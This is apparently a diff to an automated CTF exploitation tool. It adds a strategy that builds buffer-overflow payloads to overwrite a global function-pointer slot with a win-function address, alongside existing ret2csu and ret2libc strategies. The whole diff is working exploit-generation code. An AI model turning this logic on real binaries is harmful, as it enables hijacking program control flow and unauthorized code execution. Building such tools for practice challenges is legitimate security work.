@@ -584,6 +584,53 @@ def s_ret2csu(ch: Challenge, f: Facts) -> Iterable[Plan]:
                 yield Plan("ret2csu", sends, f"csu {name}({hex(bss)}) -> system off={off}")
 
 
+# --------------------------------------------------------------------------- 4b. 全局写 → 间接调用槽 → win（v7.4.2 缺口 B）
+def s_global_write_win(ch: Challenge, f: Facts) -> Iterable[Plan]:
+    """`gets/strcpy` 写全局缓冲区，附近有可写的全局函数指针槽：覆写槽位为 win。
+
+    事实全部来自 `f.global_writes` / `f.global_calls`（无 Dis、无猜测）：
+      * 只有 `0 < slot-buf` 且写满后能覆盖到槽（`gap + wordsize <= limit`，若 limit 已知）；
+      * 距离上限 0x400，最多产出 12 个计划（避免拖垮其它策略的尝试预算）；
+      * `strcpy/strcat/sprintf` 是 C 串，跳转地址含 NUL 时写不进去，跳过；
+      * 成功仍由 oracle 判「真执行命令」，槽被调用的副作用不算证据。
+    """
+    win = f.shell_win
+    writes = list(getattr(f, "global_writes", []) or [])
+    calls = list(getattr(f, "global_calls", []) or [])
+    if win is None or not writes or not calls:
+        return
+    pairs = []
+    for buf, sink, call, limit in writes:
+        span = min(limit or 0x400, 0x400)
+        for slot, icall in calls:
+            gap = slot - buf
+            if not (0 < gap <= span):
+                continue
+            if limit is not None and gap + ch.wordsize > limit:
+                continue
+            pairs.append((gap, buf, sink, call, slot, icall))
+    seen = set()
+    for gap, buf, sink, call, slot, icall in sorted(pairs):
+        key = (buf, slot, sink)
+        if key in seen:
+            continue
+        seen.add(key)
+        if len(seen) > 12:
+            break
+        if not _pack_ok(ch, win.addr, sink):
+            continue
+        raw = win.addr.to_bytes(ch.wordsize, "little")
+        if sink in ("strcpy", "strcat", "sprintf") and b"\x00" in raw:
+            continue
+        payload = b"A" * gap + raw + _term(sink)
+        for m, prompt in _prelude_variants(f):
+            steps = ([Send(m), Wait(prompt)] if m else []) + [Send(payload)]
+            yield Plan("global_write_win", steps,
+                       f"global {sink}@{hex(call)} buf={hex(buf)} -> "
+                       f"slot {hex(slot)} @ {hex(icall)} = {hex(win.addr)} gap={gap}"
+                       + (f" menu={m!r}" if m else ""))
+
+
 # --------------------------------------------------------------------------- 5b. ret2libc（write 三参数泄漏）
 def s_ret2libc_write(ch: Challenge, f: Facts) -> Iterable[Plan]:
     """没有 puts 只有 write 时：write(1, got, 8) 泄漏，再回 main 打 system。"""
@@ -1010,6 +1057,7 @@ STRATEGIES = [
     s_ret2plt,
     s_ret2gets,
     s_ret2csu,
+    s_global_write_win,   # v7.4.2：全局写 → 函数指针槽 → win
     s_guard_backfill,     # v7.4.0：strncmp 回填（只产出 gate 证据）
     s_canary_fmt,
     s_ret2libc_write,
